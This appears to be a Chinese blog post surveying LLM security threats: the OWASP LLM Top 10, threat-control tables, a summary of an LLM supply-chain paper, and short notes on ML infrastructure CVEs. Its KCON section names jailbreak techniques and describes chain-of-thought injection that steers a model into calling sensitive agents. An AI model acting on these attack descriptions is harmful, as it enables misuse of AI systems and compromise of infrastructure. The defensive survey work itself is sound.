(Model Denial ofService)</strong></p><p>攻击者在大语言模型上进行资源密集型操作，导致服务质量下降或高成本。由于语言模型的资源密集性和用户输入的不可预测性，<strong>海绵样本</strong>作为一种特别的攻击手段，利用模型处理过量的请求，从而消耗大量计算资源，最终使得模型的性能和响应速度大幅下降。</p></li><li><p><strong>LLM05: 供应链漏洞 (Supply ChainVulnerabilities)</strong></p><p>LLM应用程序生命周期可能会受到易受攻击的组件或服务的影响，从而导致安全攻击。使用第三方数据集、预训练的模型和插件会增加漏洞。典型威胁为<strong>模型篡改</strong>。</p></li><li><p><strong>LLM06: 敏感信息泄露 (Sensitive InformationDisclosure)</strong></p><p>LLM可能在其回应中透露机密数据，导致未经授权的数据访问、隐私侵犯和安全漏洞。</p></li><li><p><strong>LLM07: 不安全的插件设计 (Insecure PluginDesign)</strong></p><p>LLM插件可能存在不安全的输入和访问控制不足。这种应用程序控制的缺失使它们更易于被利用，并可能导致远程代码执行等后果。</p></li><li><p><strong>LLM08: 过度代理 (Excessive Agency)</strong></p><p>基于LLM 的系统可能会采取导致意外后果的行动。问题源于授予基于LLM的系统过多的功能、权限或自主权。</p></li><li><p><strong>LLM09: 过度依赖 (Overreliance)</strong></p><p>系统或人员过渡依赖LLM 而没有进行监督，可能会因为LLM生成的错误或不适当的内容，面临信息误导、沟通失误、法律问题和安全漏洞。</p></li><li><p><strong>LLM10: 模型窃取 (Model Theft)</strong></p><p>这涉及到未经授权的访问、复制或外泄专有的LLM模型。其影响包括经济损失，竞争优势受损，以及可能接触到敏感信息。</p></li></ul><p>这些威胁大致可以分为<strong>开发态安全威胁</strong>、<strong>使用安全威胁</strong> 和<strong>运行态安全威胁</strong>，并且在威胁分析中，通常会区分六种影响范围，针对三种攻击者目标（干扰、欺骗和泄露）：</p><ul><li><p><strong>泄露</strong></p><ul><li><p>损害训练/测试数据的机密性</p></li><li><p>损害模型知识产权的机密性（模型参数或导致这些参数的过程和数据）</p></li><li><p>损害输入数据的机密性</p></li></ul></li><li><p><strong>欺骗</strong></p><ul><li>损害模型行为的完整性（模型被操控以表现出不期望的行为，从而欺骗）</li></ul></li><li><p><strong>干扰</strong></p><ul><li>损害模型的可用性（模型无法正常工作或表现出不期望的行为——不是为了欺骗，而是为了干扰）</li></ul></li><li><p><strong>机密性、完整性和可用性</strong>（针对非AI特定资产）</p></li></ul><p>这些威胁通过不同的攻击面产生影响。例如：训练数据的机密性可以通过开发阶段黑客攻击数据库被破坏，也可以通过会员推断攻击泄露，即通过将某个人的数据输入模型，并查看模型输出的细节，来判断该人是否在训练数据中。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AI2024/AIModel.png" /></p><h2 id="安全威胁分类">安全威胁分类</h2><h3 id="开发态安全威胁">开发态安全威胁</h3><ul><li><p><strong>训练数据</strong></p></li><li><p>数据泄露</p></li><li><p>数据投毒</p></li><li><p><strong>模型安全</strong></p></li><li><p>模型窃取</p></li><li><p>模型投毒</p></li></ul><h3 id="使用安全威胁">使用安全威胁</h3><ul><li><p>规避</p></li><li><p>模型窃取</p></li><li><p>模型逆向</p></li><li><p>数据泄露</p></li><li><p>成员隐私推理</p></li><li><p>模型拒绝服务</p></li><li><p>提示词注入</p></li></ul><h3 id="运行态安全威胁">运行态安全威胁</h3><ul><li><p><strong>模型安全</strong></p></li><li><p>模型窃取</p></li><li><p>模型安全</p></li><li><p><strong>输入数据</strong></p></li><li><p>数据泄露</p></li><li><p><strong>输出数据</strong></p></li><li><p>不安全处理</p></li><li><p><strong>应用框架</strong></p></li><li><p>插件安全、权限控制</p></li></ul><h2 id="表格整理">表格整理</h2><table><thead><tr><th>资产与影响</th><th>攻击面与生命周期</th><th>威胁/风险类别</th><th>控制措施</th></tr></thead><tbody><tr><td>模型行为的完整性</td><td>运行时 - 模型使用（提供输入/读取输出）</td><td>直接提示注入</td><td>限制不希望的行为，输入验证，进一步的控制措施由模型本身实现</td></tr><tr><td></td><td></td><td>间接提示注入</td><td>限制不希望的行为，输入验证，输入隔离</td></tr><tr><td></td><td></td><td>规避（例如对抗样本）</td><td>限制不希望的行为，监控，速率限制，模型访问控制，附加措施包括：检测异常输入，检测对抗输入，对抗鲁棒模型，训练对抗样本，输入扰动，鲁棒蒸馏</td></tr><tr><td></td><td>运行时 - 突破部署模型</td><td>模型中毒（运行时重编程）</td><td>限制不希望的行为，运行时模型完整性，运行时模型输入/输出完整性</td></tr><tr><td></td><td>开发阶段 - 工程环境</td><td>开发环境中的模型中毒</td><td>限制不希望的行为，开发环境安全，数据隔离，联邦学习，供应链管理，附加措施包括：模型集成</td></tr><tr><td></td><td></td><td>训练/微调数据中毒</td><td>限制不希望的行为，开发环境安全，数据隔离，联邦学习，供应链管理，附加措施包括：更多训练数据，数据质量控制，训练数据扰动，抗中毒模型</td></tr><tr><td></td><td>开发阶段 - 供应链</td><td>供应链中的模型中毒</td><td>限制不希望的行为，供应商：开发环境安全，数据隔离，联邦学习；生产商：供应链管理，附加措施包括：模型集成</td></tr><tr><td>训练数据的机密性</td><td>运行时 - 模型使用</td><td>模型输出中的数据泄露</td><td>限制敏感数据（数据最小化，短期保留，训练数据模糊化），附加措施包括：监控，速率限制，模型访问控制，附加措施包括：过滤敏感模型输出</td></tr><tr><td></td><td></td><td>模型反演/成员推断</td><td>限制敏感数据（数据最小化，短期保留，训练数据模糊化），附加措施包括：监控，速率限制，模型访问控制，附加措施包括：模糊置信度，小模型</td></tr><tr><td></td><td>开发阶段 - 工程环境</td><td>训练数据泄露</td><td>限制敏感数据（数据最小化，短期保留，训练数据模糊化），附加措施包括：开发环境安全，数据隔离，联邦学习</td></tr><tr><td>模型机密性</td><td>运行时 - 模型使用</td><td>通过模型使用窃取（输入输出收集）</td><td>监控，速率限制，模型访问控制</td></tr><tr><td></td><td>运行时 - 突破部署模型</td><td>直接模型窃取（运行时）</td><td>运行时模型机密性，模型模糊化</td></tr><tr><td></td><td>开发阶段 - 工程环境</td><td>开发阶段的模型窃取</td><td>开发环境安全，数据隔离，联邦学习</td></tr><tr><td>模型行为的可用性</td><td>模型使用</td><td>模型服务拒绝（模型资源消耗）</td><td>监控，速率限制，模型访问控制，附加措施包括：DoS输入验证，限制资源</td></tr><tr><td>模型输入数据的机密性</td><td>运行时 - 所有IT</td><td>模型输入泄漏</td><td>模型输入机密性</td></tr><tr><td>任意资产，CIA</td><td>运行时 - 所有IT</td><td>模型输出包含注入</td><td>编码模型输出</td></tr><tr><td>任意资产，CIA</td><td>运行时 - 所有IT</td><td>常规的运行时安全攻击（对传统资产的攻击）</td><td>常规的运行时安全控制</td></tr><tr><td>任意资产，CIA</td><td>运行时 - 所有IT</td><td>常规攻击（对传统供应链的攻击）</td><td>常规的供应链管理控制</td></tr></tbody></table><h1 id="技术洞察">技术洞察</h1><h2id="kcon安全之眼大模型时代下的攻与防">KCON：安全之眼大模型时代下的攻与防</h2><blockquote><p><ahref="https://paper.vulsee.com/KCon/2024/%E5%AE%89%E5%85%A8%E4%B9%8B%E7%9C%BC%EF%BC%9A%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%97%B6%E4%BB%A3%E4%B8%8B%E7%9A%84%E6%94%BB%E4%B8%8E%E9%98%B2.pdf">安全之眼：大模型时代下的攻与防.pdf</a></p></blockquote><h3 id="llm安全攻击框架">LLM安全攻击框架</h3><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AI2024/CoreAttackSurface.png"alt="Core attack surface" /><figcaption aria-hidden="true">Core attack surface</figcaption></figure><p>通过模型安全、应用安全、基座安全、身份安全总结出对应维度的攻击方法和手段。</p><table><thead><tr><th><strong>安全类别</strong></th><th><strong>攻击方法</strong></th></tr></thead><tbody><tr><td><strong>模型安全</strong></td><td>DAN、假定场景越狱、假定角色越狱、对抗性后缀攻击、Many-Shot越狱</td></tr><tr><td><strong>应用安全</strong></td><td>角色逃逸攻击、元提示词泄露、训练知识库文件泄露、间接提示词注入、CoT注入攻击、思维链干扰注入、思维链操纵注入</td></tr><tr><td><strong>基座安全</strong></td><td>Agent运行容器逃逸、容器权限提升、集群权限接管、集群后门权限维持、集群安全防御绕过</td></tr><tr><td><strong>身份安全</strong></td><td>AI大模型自身访问与权限控制、AI大模型环境各类组件框架访问控制与权限控制、AI大模型应用环境下各种Agent调度权限</td></tr></tbody></table><h3 id="llm安全典型攻击手段">LLM安全典型攻击手段</h3><h4 id="模型越狱攻击model-jailbreaking-attack">模型越狱攻击（ModelJailbreaking Attack）</h4><p>模型越狱攻击（Model JailbreakingAttack）是一种针对模型应用的常见攻击技术。这种攻击通常通过精心构造的输入（称为“越狱提示词”）来实现攻击，目的是绕过或者干扰模型自身安全与价值观的对齐限制，进一步诱导模型输出训练数据、隐私数据等敏感信息，以及恶意操作的执行。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AI2024/ModelJailbreakAttack.png" /></p><h4 id="cot注入攻击思维链操纵注入">CoT注入攻击——思维链操纵注入</h4><p>通过观察CoT的调度过程，直接或利用对抗攻击手段构造恶意输入，实现对CoT过程的操纵，使模型跳过预置的CoT过程，直接调度敏感的Agent。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AI2024/Cot.png" /></p><h3 id="llm安全防御手段">LLM安全防御手段</h3><p>模型安全防御：自然语言的交互模式，让每个思路新奇的人都有了成为“黑客”的可能。为了更好系统安全，<strong>可以将安全防御进行前移</strong>，在模型训练、模型部署阶段，更早的保障引入安全防御措施。比如在模型训练阶段对数据进行清洗，对数据来源进行审核等措施，可以有效的抵抗数据投毒攻击。</p><p><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AI2024/Security.png" /></p><p>针对传统应用业务与大模型组合场景，可以通过Prompt内容强化/结构强化等方式进行防御。</p><table><thead><tr><th>传统应用业务组件漏洞</th><th>组合传统应用安全防护技术方案</th><th>防御方法</th></tr></thead><tbody><tr><td>业务模型应用安全风险</td><td>业务模型侧Prompt防御</td><td>Prompt内容强化、Prompt结构强化</td></tr><tr><td>模型输入侧安全风险</td><td>应用平台侧输入防御守卫机制</td><td>基于规则的检测防御、基于模型算法的检测防御（LLMs模型、分类模型等）</td></tr><tr><td>模型输出侧安全风险</td><td>应用平台侧输出防御守卫机制</td><td>基于规则的检测防御、基于模型算法的检测防御（LLMs模型、合规模型等）</td></tr></tbody></table><h2 id="大模型供应链安全研究">大模型供应链安全研究</h2><p><a href="https://arxiv.org/pdf/2404.12736">Large Language ModelSupply Chain: A Research Agenda</a></p><p>大语言模型（LLMs）在自然语言生成和代码生成等领域已经产生了深远影响。随着Agent应用范式的迅速发展，将LLMs集成到现实世界的应用中，以完成各种复杂任务，逐渐变得可行。然而，LLM应用的开发远不止是简单的模型部署或接口调用，它涉及开发、部署和维护过程中一系列第三方组件、框架和工具链的整合。这种复杂的供应链关系使得LLM系统软件容易受到各类漏洞的影响，进而威胁训练数据、模型及部署平台的完整性和可用性。</p><p>论文首次对LLM供应链进行了明确定义，并从软件工程（SE）和安全与隐私（S&amp;P）两个角度回顾了供应链各阶段的现状，识别了当前的挑战，探讨了未来的研究方向，旨在为该领域提供有价值的见解与启示。</p><h3 id="研究背景">1. 研究背景</h3><p>将LLMs集成到现实世界应用中需要一系列开发和部署工具链，如数据处理（如用于数据质量保证的Cleanlab和用于数据管理的HuggingFace Datasets）、模型训练（如用于分布式训练的PyTorchDistributed）、优化（例如，用于模型量化的 OmniQuant和用于模型合并的MergeKit）和部署（例如，用于Agent工作流编排的AutoGPT和用于检索增强生成的RAGFlow）。这些工具链的引入导致LLM应用开发、部署和维护的各个阶段都面临供应链风险，OWASP已经将供应链漏洞列入LLM应用十大安全威胁之一。然而，以往的研究尚未对LLM供应链进行明确的定义，其中所面临的挑战和未来的研究路线也不明确。</p><h3 id="llm供应链定义">2. LLM供应链定义</h3><p>论文首先提供了LLM供应链的明确定义，包括三个层级，分别是：基础设施层，基础模型层以及下游应用生态。整个供应链涉及到的参与者包括上游数据提供商、模型开发社区、模型存储库、分发平台和应用市场，以及模型开发、分发和部署过程中的研究人员、工程师、维护人员和最终用户。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AI2024/LLMSupplyChainComponent.png"alt="Definition and Each Component of the LLM Supply Chain" /><figcaption aria-hidden="true">Definition and Each Component of the LLMSupply Chain</figcaption></figure><ul><li><p><strong>基础设施层</strong>：包括计算资源，数据集和开发工具链。计算资源包括模型训练和部署过程中所涉及的硬件资源，云服务，以及分布式系统。数据集包括大规模文本语料库（包括自然语言和代码）、专业领域数据集和多模态数据集。LLM工具链包括模型训练到部署的整个生命周期中所涉及的工具、第三方组件和框架。</p></li><li><p><strong>基础模型层</strong>：以LLM开发生命周期的各个阶段划分，包括预训练、微调、测试、发布、共享、部署和维护。其中，模型发布和共享尤为关键，各种预训练模型的重用构成了模型依赖关系的基础。</p></li><li><p><strong>下游应用层</strong>：主要是基于LLM的下游应用程序，例如聊天机器人、自主代理和特定领域的LLM解决方案。上游的工具链漏洞或者模型缺陷会通过供应链传递到下游应用中。</p></li></ul><p>在LLM供应链中，存在多层级的依赖关系，简要介绍两种：一是继承自传统开源软件供应链的工具依赖，即开发工具链之间的依赖导致漏洞传播。例如，ShadowRay（CVE-2023-48022）漏洞导致数千台公开暴露的Ray服务器受到损害，受感染的GPU集群可能会被利用并部署挖矿软件。其次是来自于预训练模型和数据集复用的依赖关系。开发者通过模型/数据集共享平台（例如HuggingFace）来实现预训练模型/数据集重用，由此产生的模型/数据集依赖也会导致安全风险传播。近期的相关研究揭示了针对预训练模型/数据集的恶意代码投毒攻击实例，可能造成下游用户在加载模型/数据集是导致恶意代码执行。此外，模型或数据集中的偏见，毒性内容，幻觉，甚至后门也会随着模型/数据集依赖传播到下游模型乃至应用中，由于模型本身的黑盒特性，静态检测很难保证模型安全性。</p><h3 id="研究路线图">3. 研究路线图</h3><p>基于上述定义与分析，论文从软件工程和安全的视角来分析LLM供应链的现状，确定其中存在的关键挑战并且制定未来的研究路线。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/AI2024/LLMSupplyChainAgenda.png"alt="Research Agenda for the LLM Supply Chain" /><figcaption aria-hidden="true">Research Agenda for the LLM SupplyChain</figcaption></figure><h4 id="基础设施层">3.1. 基础设施层</h4><p>基础设施层所面临的挑战与快速发展的LLM生态密切相关，计算资源、数据集、工具链，任一环节的安全问题都可能传播到下游模型训练和应用开发过程中，造成严重的安全影响。</p><ul><li><p>计算资源：硬件供应商单一过度依赖引发了潜在的供应链脆弱性，一些硬件级漏洞在LLM供应链中可能产生严重的安全后果。随着模型趋向更大更复杂，分布式系统和专有AI云服务已被广泛采用，但也引入了新的攻击面。最近，PyTorch的分布式RPC系统中发现了一个关键漏洞（CVE-2024-5480）。由于输入验证不足，可能允许当工作节点序列化并发送Python自定义函数（UDFs）到另一个节点时执行远程代码。</p></li><li><p>数据集：目前LLM供应链中的数据集具有前所未有的规模和多样性，并且对数据质量、偏见和隐私的关注日益增加。在代码大模型领域，开源仓库中的代码已成为训练数据的关键来源，这对代码质量、开源许可证和代码中潜在的安全漏洞都提出了更高的要求。此外，数据集管理组件中也可能存在潜在的安全漏洞，在数据集准备和模型训练工作流程中需要实施更严格的安全实践。</p></li><li><p>工具链：LLM的开发工具链包括许多新兴的第三方库、框架和专有工具。像HuggingFace的Transformers库可能在LLM供应链中引入系统性漏洞，PyTorch和TensorFlow等传统AI框架也常常会存在安全问题。例如，TensorFlow的Keras框架中LambdaLayer存在漏洞（CVE-2024-3660），允许任意代码注入，而PyTorch使用Pickle进行模型序列化也引入了潜在的反序列化漏洞。此外，针对LLM开发、部署和维护有许多新兴的开源框架或工具发布。LLM开发工具链的日益复杂，加上该领域的快速迭代，给整个LLM开发、部署和维护流程中的安全实践带来了巨大挑战。</p></li></ul><h4 id="基础模型层">3.2. 基础模型层</h4><p>基础模型层主要关注于LLM训练，测试，发布和部署的相关内容。关于模型训练和测试部分，相关研究十分普遍，包括模型对齐，性能测试，可靠性测试（幻觉，事实一致性），安全性测试（提示注入，越狱攻击），道德和无害性测试（隐私，偏见等）。本文仅对模型内容安全方面的相关挑战进行了概述，重点关注于模型共享和发布阶段，强调模型复用衍生的一系列供应链角度的研究问题。</p><ul><li>模型共享：在LLM供应链中，模型发布和共享构成了模型间复用与依赖的核心。像HuggingFace这样的平台目前已经托管了超过110万模型和24万数据集（截止11月22日），显著提高了模型和数据集开发过程中的协作性和可重用性。然而，供应链风险管理仍然是一个关键挑战，特别是在模型来源和安全保证方面。模型卡片和相关文档，往往无法准确反映模型的真实性质和能力。这种脆弱的模型来源验证使生态系统容易受到恶意模型投毒和其他形式的篡改。通过微调、模型合并等技术重用模型引入了复杂的模型依赖关系，可能导致风险传播。然而，当前的开源模型生态系统缺乏对这些相互依赖关系进行建模。模型本质上被视为黑盒，易受攻击的预训练模型可能隐藏着偏见、后门或其他恶意特征。除此之外，LLM的开源许可管理仍然是一个争议性问题，例如，围绕像Llama3这样的模型的许可条款对模型命名提出了严格要求，可能会出现一些许可合规性问题。此外，模型托管平台本身的安全性也值得关注。像HuggingFace平台上托管的模型转换工具这样的服务已被证明容易受到操纵，可能允许恶意代码被引入到LLM中。</li></ul><h4 id="下游应用生态">3.3. 下游应用生态</h4><p>下游应用生态直接面向用户交互，各种潜在的缺陷和安全问题都会直接暴露并且影响用户体验。目前，将LLM集成到现实世界应用中有各种各样的形式，我们主要以LLM对话系统和Agent代理来展开介绍。</p><ul><li><p>LLM对话系统：由LLM驱动的对话系统和应用代表了LLM供应链下游生态的典型范式。这些应用利用LLM的能力，为不同领域提供交互式的智能解决方案。像GPTStore这样的平台正在成为集中枢纽，开发者可以在此发布他们的LLM应用（即GPTs），用户可以访问并使用这些工具来完成特定的任务和目标。这个生态系统与移动应用商店类似，旨在为LLM应用创建一个安全和用户友好的环境。LLM应用的普及降低了开发者准入门槛。然而，这种快速的增长和可访问性也引入了新的漏洞和治理挑战。随着这些平台的发展，它们必须应对LLM应用特有的新型安全威胁，如提示注入攻击和高级功能如函数调用的潜在误用。此外，LLM应用的独特性质，即能够实时生成和操纵内容，也对质量控制、伦理考量和法规遵从提出了前所未有的挑战。</p></li><li><p>LLM代理：LLM驱动的自主代理（ALAs）能够提供跨多个领域的自主或半自主任务执行。这些代理利用LLM的高级推理和知识合成能力来执行复杂任务，做出决策，并以复杂的方式与用户和系统互动。复杂的ALAs架构将LLM与外部工具、知识库和决策框架相结合。这些代理越来越能够以最小的人工干预执行复杂、多步骤的任务。例如，在软件开发领域，ALAs被用于代码生成、调试，甚至系统设计。然而，随着这些进展，关于越来越多的关于ALAs的伦理影响和潜在风险的担忧也在增长。一方面的安全挑战是存在易受攻击的代理逻辑。ALAs依赖于非确定性结果，验证代理行为是从逻辑上可能是不全面的，对手可以识别并利用代理逻辑中的漏洞来实现恶意结果。另一方面，基于LLM的代理可能会获得未预期的控制或决策能力水平，可能导致有害或未经授权的行为，对系统完整性、数据安全和用户安全构成风险。</p></li></ul><h3 id="结论">4. 结论</h3><p>LLMs的强大的生成能力和集成到下游Agent中完成现实世界任务复杂任务的潜力，使得围绕LLMs的系统软件生态日益繁荣。该生态中的各种开源制品（包括预训练模型、数据集、提示词和工具链）的复用和交互产生了一系列复杂的依赖关系，共同构成了LLM供应链。目前，围绕LLM供应链的相关研究尚处于起步阶段，缺乏系统的方向性指导。因此，本文提出了第一个全面的LLM供应链研究议程，通过对LLM供应链的组成成分和依赖关系进行定义，总结并回顾LLM供应链各部分的研究现状。在此基础上，本文通过软件工程和安全的双重视角对LLM供应链进行系统性分析，确定了LLM生态快速发展所带来的复杂挑战和研究机遇，并拟定了一个初步的研究议程，旨在为该领域未来的研究提供宝贵见解。</p><h2 id="大模型基础设施风险">大模型基础设施风险</h2><p>对项目大模型渗透测试过程中，我们可以通过<strong>prompt作为输入结合传统的攻击模式</strong>，可以组合成各种新的攻击路径，漏洞攻击入口为大模型的生命的周期的各个阶段，<strong>最终利用点为传统的安全漏洞利用模式</strong>。</p><table><thead><tr><th><strong>攻击类别</strong></th><th><strong>攻击描述</strong></th></tr></thead><tbody><tr><td><strong>ModelHub数据集投毒</strong></td><td>NVDB-CNVDB-2023879241数据集加载时进行脚本注入，在远程加载数据集时，存在同名python脚本会自动导入运行，该漏洞可以同时影响HuggingFace平台和用户。</td></tr><tr><td><strong>供应链投毒：模型、数据集、词表和知识库</strong></td><td>除了数据集、模型、词表和检索知识库，都可能成为供应链投毒的目标。供应链攻击将风险转化为实际漏洞危害：<br>CVE-2023-6730 RagRetriever.from_pretrained加载时的反序列化漏洞；<br>CVE-2023-7018 AutoTokenizer.from_pretrained加载时的反序列化漏洞。</td></tr><tr><td><strong>ModelHub钓鱼和水坑攻击</strong></td><td>任意HF平台用户可伪造组织、项目进行针对性邮件钓鱼和水坑攻击。<br>注册组织成本低、不在乎实名认证、恶意刷顶排行榜、滥用的信任关系、缺少完整性校验。</td></tr><tr><td><strong>供应链模型后门</strong></td><td>不同的模型框架支持不同的模型格式，模型文件除了数据外，还可能包含调用框架能力的代码。支持代码执行的格式包括pickle、onnx、safetensor等。</td></tr><tr><td><strong>TorchScript绕过安全策略</strong></td><td>TorchScript是一个用于将Python代码转换为可在C++环境中执行的序列化表示的工具，允许PyTorch模型导出为文件并在无Python环境的情况下执行。<br>NVDB-CNVDB-2024890770漏洞为C++处理TorchScript反序列化过程中存在越界访问漏洞。</td></tr><tr><td><strong>分布式网络基础设施漏洞</strong></td><td>PyTorch中的分布式RPC组件漏洞，PyTorch分布式RPC用于支持分布式训练和推理，允许不同设备或进程之间高效通信和协作。<br>CVE-2024-5480漏洞，攻击者可通过操作RPC调用，利用内置Python函数执行任意代码，从而完全控制主节点。</td></tr><tr><td><strong>NCCL集合通信库漏洞</strong></td><td>NCCL是一个高性能的多GPU通信库，专为GPU加速设计，旨在简化多GPU和多节点系统中的数据同步和传输。<br>NVDB-CNVDB-2024857163漏洞，未授权访问网络端口导致内存越界访问，可能导致远程代码执行。</td></tr><tr><td><strong>Triton-Inference推理框架漏洞</strong></td><td>CVE-2023-31036，API接口存在任意文件写入漏洞，攻击者可覆盖模型配置文件，将任意文件写入，从而升级为远程代码执行。</td></tr><tr><td><strong>Ray计算框架漏洞</strong></td><td>Ray是开源分布式计算框架，为并行处理提供计算层，用于扩展AI与Python应用程序。<br>CVE-2023-48022，ShadowRay访问Dashboard的API接口提交任务，导致远程代码执行。</td></tr></tbody></table><h2 id="blackhat议题">BlackHat议题</h2><p>- <strong>[BlackhatUSA’24]</strong> 实战LLM安全：一年来的实战经验 <ahref="https://www.blackhat.com/us-24/briefings/schedule/#practical-llm-security-takeaways-from-a-year-in-the-trenches-39468">[链接]</a><ahref="https://i.blackhat.com/BH-US-24/Presentations/US24-Harang-Practical-LLM-Security-Takeaways-From-Wednesday.pdf?_gl=1*7acwri*_gcl_au*MjEyNjc0MzYwNC4xNzMxMTM3MDA2*_ga*MTM5MTcwNjc4OS4xNzMxMTM3MDA2*_ga_K4JK67TFYV*MTczMTEzNzAwNi4xLjAuMTczMTEzNzAwNi4wLjAuMA..&amp;_ga=2.180973351.1863731842.1731137007-1391706789.1731137006">[幻灯片]</a></p><p>- <strong>[BlackhatUSA’24]</strong>隔离还是幻觉？为乐趣和权重攻击AI基础设施提供商 <ahref="https://www.blackhat.com/us-24/briefings/schedule/#isolation-or-hallucination-hacking-ai-infrastructure-providers-for-fun-and-weights-40569">[链接]</a></p><p>- <strong>[BlackhatUSA’24]</strong> 从MLOps到MLOops -揭示机器学习平台的攻击面 <ahref="https://www.blackhat.com/us-24/briefings/schedule/#from-mlops-to-mloops---exposing-the-attack-surface-of-machine-learning-platforms-39309">[链接]</a><ahref="https://i.blackhat.com/BH-US-24/Presentations/US24-Menashe-From-MLOps-To-MLOops.pdf?_gl=1*1vixzrp*_gcl_au*MjEyNjc0MzYwNC4xNzMxMTM3MDA2*_ga*MTM5MTcwNjc4OS4xNzMxMTM3MDA2*_ga_K4JK67TFYV*MTczMTEzNzAwNi4xLjEuMTczMTEzNzI1MS4wLjAuMA..&amp;_ga=2.140149939.1863731842.1731137007-1391706789.1731137006">[幻灯片]</a></p><p>- <strong>[BlackhatASIA’24]</strong> LLM4Shell:发现并利用在真实世界中LLM集成框架和应用中的RCE漏洞 <ahref="https://www.blackhat.com/asia-24/briefings/schedule/index.html#llmshell-discovering-and-exploiting-rce-vulnerabilities-in-real-world-llm-integrated-frameworks-and-apps-37215">[链接]</a><ahref="https://i.blackhat.com/Asia-24/Presentations/bh-asia-2024-llm4shell.pdf?_gl=1*lfjimg*_gcl_au*MjEyNjc0MzYwNC4xNzMxMTM3MDA2*_ga*MTM5MTcwNjc4OS4xNzMxMTM3MDA2*_ga_K4JK67TFYV*MTczMTEzNzAwNi4xLjEuMTczMTEzNzg4OS4wLjAuMA..&amp;_ga=2.89155611.1863731842.1731137007-1391706789.1731137006">[幻灯片]</a></p><p>- <strong>[BlackhatASIA’24]</strong>混淆学习：通过机器学习模型进行供应链攻击 <ahref="https://www.blackhat.com/asia-24/briefings/schedule/index.html#confused-learning-supply-chain-attacks-through-machine-learning-models-37794">[链接]</a><ahref="https://i.blackhat.com/Asia-24/Presentations/Asia-24-Wood-Confused-Learning.pdf?_gl=1*xwt703*_gcl_au*MjEyNjc0MzYwNC4xNzMxMTM3MDA2*_ga*MTM5MTcwNjc4OS4xNzMxMTM3MDA2*_ga_K4JK67TFYV*MTczMTEzNzAwNi4xLjEuMTczMTEzODExMy4wLjAuMA..&amp;_ga=2.160178365.1863731842.1731137007-1391706789.1731137006">[幻灯片]</a></p><p>- <strong>[BlackhatASIA’24]</strong> 如何让HuggingFace拥抱蠕虫：发现并利用不安全的Pickle.loads在预训练的大型模型库中的漏洞<ahref="https://www.blackhat.com/asia-24/briefings/schedule/index.html#how-to-make-hugging-face-to-hug-worms-discovering-and-exploiting-unsafe-pickleloads-over-pre-trained-large-model-hubs-36261">[链接]</a><ahref="https://i.blackhat.com/Asia-24/Presentations/Asia-24-Zhou-HowtoMakeHuggingFace.pdf?_gl=1*ymvfd9*_gcl_au*MjEyNjc0MzYwNC4xNzMxMTM3MDA2*_ga*MTM5MTcwNjc4OS4xNzMxMTM3MDA2*_ga_K4JK67TFYV*MTczMTEzNzAwNi4xLjEuMTczMTEzODIzNi4wLjAuMA..&amp;_ga=2.51586089.1863731842.1731137007-1391706789.1731137006">[幻灯片]</a></p><h1 id="洞察总结">洞察总结</h1><p>从业界技术洞察可以看到，大模型的攻击越狱手段不断增加，对内容安全有较好的攻击及自动化攻击思路，其他的RCE攻击模式，主要还是<strong>依赖传统的安全漏洞与大模型特有的Prompt相结合</strong>。</p><p>针对建设蓝队的正向安全能力，可以根据AI系统的各个组件进行分类，包括数据组件、算法模型、AI框架组件和基础设施组件，进而总结出AI系统的核心资产：原始数据、预处理数据、已标注数据、训练数据、增强数据、验证数据、测试数据、用户输入数据、RAG数据、推理数据、数据预处理算法、模型超参数、训练算法、模型参数、已训练模型、已部署模型、已下线模型、生成AI模型所需的工具和平台、系统部署所用的工具和平台、训练设施以及部署设施等。根据这些资产的类型，可以构建相应的威胁模型。</p><p>以已部署模型为例，这些模型已经完成了训练和测试，并被集成到实际应用或生产环境中，能够处理真实世界的数据并提供预测或决策支持，如回归分析、预测和异常检测等任务。部署是机器学习生命周期中的关键环节，涉及将模型从开发环境迁移到生产环境。</p><p>在此过程中，模型和相关组件可能面临多种安全威胁，包括但不限于以下类型：</p><ul><li><p>模型窃取攻击</p></li><li><p>模型逆向攻击</p></li><li><p>数字对抗样本攻击</p></li><li><p>物理对抗样本攻击</p></li><li><p>模型提取攻击</p></li><li><p>提示词注入攻击</p></li><li><p>目标劫持攻击</p></li><li><p>提示词泄露攻击</p></li><li><p>提示词越狱攻击</p></li><li><p>属性推理攻击</p></li><li><p>数据重建攻击</p></li><li><p>成员推理攻击</p></li><li><p>海绵样本攻击</p></li><li><p>模型文件篡改攻击</p></li><li><p>模型倾斜攻击</p></li><li><p>不安全的任务规划（AI智能体）</p></li><li><p>模型非授权获取</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>LLM Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LLM Security</tag>
      
      <tag>Threat Analysis</tag>
      
      <tag>Model Safety</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>雅思学习笔记</title>
    <link href="/2024/03/25/IELTS/"/>
    <url>/2024/03/25/IELTS/</url>
    
    <content type="html"><![CDATA[<p><a href="https://mundi-xu.github.io/ielts/">My IELTS LearningCentre</a></p><p>针对单词学习，可以选择下列的Prompt：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 